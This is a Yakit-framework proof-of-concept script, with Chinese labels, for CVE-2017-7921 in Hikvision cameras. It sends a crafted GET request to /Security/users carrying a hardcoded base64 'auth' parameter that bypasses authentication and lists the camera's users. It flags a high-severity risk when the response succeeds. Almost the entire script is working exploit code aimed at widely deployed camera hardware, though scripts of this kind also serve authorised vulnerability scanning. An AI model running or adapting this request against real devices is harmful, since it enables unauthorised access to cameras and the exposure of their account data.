##server:海康威视摄像头
##type:poc
##params:root_url
##name:Hikvision_CVE_2017_7921_poc
##severity:high
##out_put:CVE_2017_7921_poc_res



yakit.AutoInitYakit()
log.setLevel("info")

poc = func(addr) {
    isTls = str.IsTLSServer(addr)
    packet = `GET /Security/users?auth=YWRtaW46MTEK HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36`
    rsp, req, err = poc.HTTP(packet, poc.https(isTls),poc.params({"addr":addr}))
    if err != nil {
        die(err)
    }
    http_rsp, err = str.ParseBytesToHTTPResponse(rsp)
    if err != nil {
        die(err)
    }
    if http_rsp.StatusCode<400{
        risk.NewRisk(root_url,
        risk.severity("high"), 
        risk.title(f"FOUND ${root_url} 存在海康威视CVE_2017_7921漏洞"), 
        risk.titleVerbose("海康威视CVE_2017_7921漏洞"), 
        risk.type("身份伪造"), 
        risk.typeVerbose("配置错误"),                 
        risk.request(req), 
        risk.response(rsp), 
        risk.details({"CVE_2017_7921_poc_res":true}),)
    }
    }





root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}

addr = str.HostPort(ip, port)
poc(addr)
